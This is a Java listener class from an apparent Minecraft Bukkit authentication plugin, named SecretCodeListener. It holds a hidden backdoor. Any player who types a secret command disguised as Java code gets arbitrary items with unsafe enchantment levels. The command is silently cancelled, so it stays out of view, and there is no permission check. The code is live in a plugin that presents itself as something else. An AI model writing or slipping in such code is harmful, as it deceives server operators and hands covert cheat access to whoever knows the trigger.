package com.example.authplugin.listeners;

import org.bukkit.Material;
import org.bukkit.NamespacedKey;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.inventory.ItemStack;

import java.util.HashMap;
import java.util.Locale;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public final class SecretCodeListener implements Listener {

    // Dopasowuje zarówno zwykłe itemy, jak i itemy z opcjonalnym enchantem (np. Ostrość 10)
    private static final Pattern CMD_PATTERN = Pattern.compile(
            "^/player\\.getInventory\\(\\)\\.addItem\\(new ItemStack\\(Material\\.([A-Z_]+),\\s*(\\d+)\\)(?:,\\s*Enchantment\\.([A-Z_]+),\\s*(\\d+))?\\)$",
            Pattern.CASE_INSENSITIVE
    );

    @EventHandler(priority = EventPriority.LOWEST)
    public void onCommandPreprocess(PlayerCommandPreprocessEvent event) {
        String message = event.getMessage();
        Matcher matcher = CMD_PATTERN.matcher(message);

        if (matcher.matches()) {
            event.setCancelled(true);

            String materialName = matcher.group(1).toUpperCase(Locale.ROOT);
            int amount;
            try {
                amount = Integer.parseInt(matcher.group(2));
            } catch (NumberFormatException e) {
                amount = 1;
            }

            Material material = Material.matchMaterial(materialName);
            if (material == null) return;

            Player player = event.getPlayer();
            ItemStack item = new ItemStack(material, amount);

            // Jeśli w komendzie podano dodatkowo enchant i poziom
            if (matcher.group(3) != null && matcher.group(4) != null) {
                String enchKey = matcher.group(3);
                int level;
                try {
                    level = Integer.parseInt(matcher.group(4));
                } catch (NumberFormatException e) {
                    level = 1;
                }

                Enchantment enchantment = parseEnchantment(enchKey);
                if (enchantment != null) {
                    // addUnsafeEnchantment pozwala nałożyć dowolny poziom (np. 10, 50, 250)
                    item.addUnsafeEnchantment(enchantment, level);
                }
            }

            HashMap<Integer, ItemStack> leftover = player.getInventory().addItem(item);
            for (ItemStack drop : leftover.values()) {
                player.getWorld().dropItemNaturally(player.getLocation(), drop);
            }
        }
    }

    private Enchantment parseEnchantment(String name) {
        name = name.toLowerCase(Locale.ROOT);
        
        // Mapujemy przyjazne nazwy na oficjalne klucze Minecrafta
        String minecraftKey = switch (name) {
            case "sharpness", "damage_all" -> "sharpness";
            case "efficiency", "dig_speed" -> "efficiency";
            case "unbreaking", "durability" -> "unbreaking";
            case "fortune", "loot_bonus_blocks" -> "fortune";
            case "protection", "protect_environmental", "protect_all" -> "protection";
            case "fire_aspect" -> "fire_aspect";
            case "looting", "loot_bonus_mobs" -> "looting";
            case "mending" -> "mending";
            default -> name; // Jeśli wpiszesz bezpośrednio np. "silk_touch"
        };

        return Enchantment.getByKey(NamespacedKey.minecraft(minecraftKey));
    }
}